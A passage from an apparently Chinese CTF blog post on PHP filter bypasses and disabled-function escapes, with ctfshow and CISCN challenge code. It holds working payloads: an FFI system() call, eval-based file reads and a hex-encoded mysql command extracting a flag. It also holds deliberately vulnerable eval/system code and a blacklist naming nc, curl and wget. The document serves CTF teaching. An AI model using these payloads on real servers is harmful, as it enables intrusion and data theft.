<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">file=<br><span class="hljs-variable">$ffi</span> = FFI::<span class="hljs-title function_ invoke__">cdef</span>(<span class="hljs-string">&quot;int system(const char *command);&quot;</span>);   <span class="hljs-comment">// 创建一个system对象</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;/readflag &gt; flag.txt&#x27;</span>;    <span class="hljs-comment">// 此步无回显</span><br><span class="hljs-variable">$ffi</span>-&gt;<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$a</span>);    <span class="hljs-comment">// 通过$ffi去调用system函数</span><br><br>访问url/flag.txt即可获取flag；<br></code></pre></td></tr></table></figure>

<h2 id="举些例子"><a href="#举些例子" class="headerlink" title="举些例子"></a>举些例子</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();  <span class="hljs-comment">// 获取缓冲区的数据</span><br>        <span class="hljs-title function_ invoke__">ob_end_clean</span>();  <span class="hljs-comment">// 清除缓冲区的内容并将缓冲区关闭，但不会输出内容</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-variable">$s</span>);  <span class="hljs-comment">// 全字母、全数字过滤</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>你要上天吗？<br><br>payload1:<br>    c=<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-string">&#x27;../../../*&#x27;</span>))<span class="hljs-title function_ invoke__">ob_flush</span>();<br>    c=<span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<span class="hljs-title function_ invoke__">ob_flush</span>();<br><br>payload2:<br>    c=<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&quot;/&quot;</span>));<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>    c=<span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// CISCN国赛_Web_simple_php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, <span class="hljs-string">&#x27;/var/www/html/&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <br>     <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>         <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br><br>解题思路：<br>    <span class="hljs-number">1</span>. 利用php -r执行命令，注意绕过过滤；<br>    <span class="hljs-number">2</span>. flag不在目录当中，此时一般在数据库中；<br>    <span class="hljs-number">3</span>. 使用十六进制编码绕过过滤；<br><br>payload:<br>    cmd=php -r <span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">substr</span>(_6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d652027757365205048505f434d533b73656c656374202a2066726f6d20463161675f5365335265373b27603b,<span class="hljs-number">1</span>)));<br></code></pre></td></tr></table></figure>

<h1 id="Bash内置变量"><a href="#Bash内置变量" class="headerlink" title="Bash内置变量"></a>Bash内置变量</h1><p>利用Bash内置变量构造命令执行语句；</p>
<h1 id=""><a href="#" class="headerlink" title="&lt;- To be continued  _(:3 ∠)__"></a>&lt;- To be continued  _(:3 ∠)__</h1><pre>
  く__,.ヘヽ.        /  ,ー､ 〉
           ＼ ', !-─‐-i  /  /´
           ／｀ｰ'       L/／｀ヽ､
         /   ／,   /|   ,   ,       ',
       ｲ   / /-‐/  ｉ  L_ ﾊ ヽ!   i
        ﾚ ﾍ 7ｲ｀ﾄ   ﾚ'ｧ-ﾄ､!ハ|   |
          !,/7 '0'     ´0iソ|    |
          |.从"    _     ,,,, / |./    |
          ﾚ'| i＞.､,,__  _,.イ /   .i   |
            ﾚ'| | / k_７_/ﾚ'ヽ,  ﾊ.  |
              | |/i 〈|/   i  ,.ﾍ |  i  |
             .|/ /  ｉ：    ﾍ!    ＼  |
              kヽ>､ﾊ    _,.ﾍ､    /､!
              !'〈//｀Ｔ´', ＼ ｀'7'ｰr'
              ﾚ'ヽL__|___i,___,ンﾚ|ノ
                  ﾄ-,/  |___./
                  'ｰ'    !_,.:
</pre><div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-start"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/blog233.github.io/2024/09/21/Misc%E6%89%93%E6%9D%82%E5%9C%A3%E7%BB%8F/">← Next Misc打杂圣经</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/blog233.github.io/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">RngAd33</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/RngAd33"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" href="mailto:yxbsyx@outlook.com"><i class="fa fa-envelope" alt="E-Mail"></i></a><a class="social" target="_blank" rel="noopener" href="https://space.bilibili.com/403699403/favlist?fid=2455564303&amp;ftype=create"><i class="fa-brands fa-bilibili" alt="BiliBili"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E4%B8%A5%E6%A0%BC%E8%BF%87%E6%BB%A4"><span class="toc-number">1.</span> <span class="toc-text">绕过严格过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E8%AF%8D%E6%B1%87%E8%BF%87%E6%BB%A4"><span class="toc-number">1.1.</span> <span class="toc-text">敏感词汇过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E5%AD%97%E7%AC%A6%E8%BF%87%E6%BB%A4"><span class="toc-number">1.2.</span> <span class="toc-text">敏感字符过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%A8%E6%95%B0%E5%AD%97%E8%BF%87%E6%BB%A4"><span class="toc-number">1.3.</span> <span class="toc-text">全数字过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%A8%E5%AD%97%E6%AF%8D%E8%BF%87%E6%BB%A4"><span class="toc-number">1.4.</span> <span class="toc-text">全字母过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%A8%E6%95%B0%E5%AD%97%E3%80%81%E5%85%A8%E5%AD%97%E6%AF%8D%E8%BF%87%E6%BB%A4"><span class="toc-number">1.5.</span> <span class="toc-text">全数字、全字母过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BE%E4%BA%9B%E4%BE%8B%E5%AD%90%EF%BC%88%E4%BB%A5%E4%B8%8B%E9%A2%98%E7%9B%AE%E6%9D%A5%E8%87%AActfshow%EF%BC%89%EF%BC%9A"><span class="toc-number">1.6.</span> <span class="toc-text">举些例子（以下题目来自ctfshow）：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AA%81%E7%A0%B4%E7%A6%81%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">2.</span> <span class="toc-text">突破禁用函数</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8"><span class="toc-number">2.1.</span> <span class="toc-text">函数调用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%A6%E6%88%AA%E8%B7%B3%E5%87%BA"><span class="toc-number">2.2.</span> <span class="toc-text">拦截跳出</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#glob%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.3.</span> <span class="toc-text">glob伪协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">2.4.</span> <span class="toc-text">连接数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FFI%EF%BC%88%E4%BB%85%E9%99%90%E4%BA%8EPHP7-4%E5%8F%8A%E4%BB%A5%E4%B8%8A%E7%89%88%E6%9C%AC%EF%BC%89"><span class="toc-number">2.5.</span> <span class="toc-text">FFI（仅限于PHP7.4及以上版本）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BE%E4%BA%9B%E4%BE%8B%E5%AD%90"><span class="toc-number">2.6.</span> <span class="toc-text">举些例子</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Bash%E5%86%85%E7%BD%AE%E5%8F%98%E9%87%8F"><span class="toc-number">3.</span> <span class="toc-text">Bash内置变量</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">&lt;- To be continued  _(:3 ∠)__</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas></body></html>